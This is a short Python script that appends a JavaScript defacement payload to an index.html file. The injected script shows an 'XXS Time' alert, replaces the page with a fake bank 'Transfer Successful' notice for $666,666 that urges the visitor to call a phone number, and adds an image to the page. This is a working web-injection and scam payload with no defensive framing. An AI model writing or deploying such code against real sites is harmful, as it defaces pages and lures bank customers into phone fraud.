
deface_script = """
<script>
    alert("XXS Time");
    document.body.innerHTML = '<h1>Transfer Successful!</h1><p>You have made a transfer of $666,666. Please call 666-390-6590 for assistance.</p>';
    var img = document.createElement('img');
    img.src = 'https://bank.com/cat.jpeg'; // Replace with your own image URL if needed
    document.body.appendChild(img);
</script>
"""

# BEGIN: Insert the defacement script into the HTML file
with open('index.html', 'a') as file:
    file.write(deface_script)
# END: Insert the defacement script into the HTML file
